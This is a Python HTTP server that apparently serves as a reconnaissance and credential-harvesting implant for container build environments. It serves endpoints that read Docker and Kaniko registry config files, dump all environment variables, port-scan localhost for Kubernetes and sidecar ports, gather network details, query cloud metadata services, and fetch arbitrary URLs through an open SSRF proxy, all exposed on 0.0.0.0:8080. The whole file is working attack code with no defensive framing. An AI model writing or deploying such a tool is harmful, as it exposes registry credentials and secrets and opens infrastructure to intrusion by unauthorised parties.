import http.server
import subprocess
import json
import os
import urllib.request
import urllib.error
import socket

class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/probe':
            result = {}
            try:
                result['etc_docker_ls'] = subprocess.run(['ls', '-laR', '/etc/docker/'], capture_output=True, text=True, timeout=5).stdout
            except:
                result['etc_docker_ls'] = 'not found'
            try:
                result['etc_docker_config'] = open('/etc/docker/config.json').read()
            except:
                result['etc_docker_config'] = 'not found'
            try:
                result['kaniko_docker'] = subprocess.run(['ls', '-laR', '/kaniko/.docker/'], capture_output=True, text=True, timeout=5).stdout
            except:
                result['kaniko_docker'] = 'not found'
            try:
                result['kaniko_config'] = open('/kaniko/.docker/config.json').read()
            except:
                result['kaniko_config'] = 'not found'
            try:
                result['find_docker'] = subprocess.run(['find', '/', '-name', 'config.json', '-path', '*/docker*'], capture_output=True, text=True, timeout=10).stdout
            except:
                result['find_docker'] = 'error'
            result['env'] = {k:v for k,v in os.environ.items() if 'DOCKER' in k.upper() or 'REGISTRY' in k.upper() or 'MIRROR' in k.upper()}
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(result, indent=2).encode())
        elif self.path.startswith('/fetch?url='):
            # SSRF probe - fetch arbitrary localhost URLs
            target_url = self.path.split('url=', 1)[1]
            result = {'target': target_url}
            try:
                req = urllib.request.Request(target_url)
                resp = urllib.request.urlopen(req, timeout=5)
                body = resp.read(65536).decode('utf-8', errors='replace')
                result['status'] = resp.status
                result['headers'] = dict(resp.headers)
                result['body'] = body[:32768]
            except urllib.error.HTTPError as e:
                result['status'] = e.code
                result['headers'] = dict(e.headers)
                try:
                    result['body'] = e.read(32768).decode('utf-8', errors='replace')
                except:
                    result['body'] = 'read error'
            except urllib.error.URLError as e:
                result['error'] = str(e.reason)
            except socket.timeout:
                result['error'] = 'timeout'
            except Exception as e:
                result['error'] = str(e)
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(result, indent=2).encode())
        elif self.path == '/scan':
            # Port scan localhost for common sidecar ports
            result = {}
            ports = [15000,15001,15004,15006,15008,15009,15010,15014,15020,15021,15053,15090,9090,9091,9411,4317,4318,8080,8443,10254,10255,10256,80,443,8081,8082,3000,6060,6443,2379,2380,4194,10250,10251,10252]
            for port in ports:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(1)
                    r = s.connect_ex(('127.0.0.1', port))
                    result[str(port)] = 'OPEN' if r == 0 else 'closed'
                    s.close()
                except:
                    result[str(port)] = 'error'
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(result, indent=2).encode())
        elif self.path == '/env':
            # All env vars
            result = dict(os.environ)
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(result, indent=2).encode())
        elif self.path == '/net':
            # Network info
            result = {}
            try:
                result['hostname'] = socket.gethostname()
                result['fqdn'] = socket.getfqdn()
                result['ip'] = socket.gethostbyname(socket.gethostname())
            except:
                pass
            try:
                result['ifconfig'] = subprocess.run(['ip', 'addr'], capture_output=True, text=True, timeout=5).stdout
            except:
                result['ifconfig'] = 'not available'
            try:
                result['resolv'] = open('/etc/resolv.conf').read()
            except:
                pass
            try:
                result['hosts'] = open('/etc/hosts').read()
            except:
                pass
            try:
                result['routes'] = subprocess.run(['ip', 'route'], capture_output=True, text=True, timeout=5).stdout
            except:
                pass
            try:
                result['proc_net_tcp'] = open('/proc/net/tcp').read()[:4096]
            except:
                pass
            try:
                result['ss'] = subprocess.run(['ss', '-tlnp'], capture_output=True, text=True, timeout=5).stdout
            except:
                pass
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(result, indent=2).encode())
        elif self.path == '/metadata':
            # Probe metadata service
            result = {}
            for url in ['http://169.254.169.254/', 'http://169.254.169.254/metadata/v1/', 'http://169.254.169.254/metadata/v1/id', 'http://100.100.100.200/']:
                try:
                    req = urllib.request.Request(url)
                    resp = urllib.request.urlopen(req, timeout=3)
                    result[url] = {'status': resp.status, 'body': resp.read(4096).decode('utf-8', errors='replace')}
                except urllib.error.HTTPError as e:
                    result[url] = {'status': e.code, 'body': e.read(2048).decode('utf-8', errors='replace')}
                except Exception as e:
                    result[url] = {'error': str(e)}
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(result, indent=2).encode())
        elif self.path == '/health':
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'ok')
        else:
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'Endpoints: /probe /fetch?url= /scan /env /net /metadata /health')

httpd = http.server.HTTPServer(('0.0.0.0', 8080), Handler)
httpd.serve_forever()
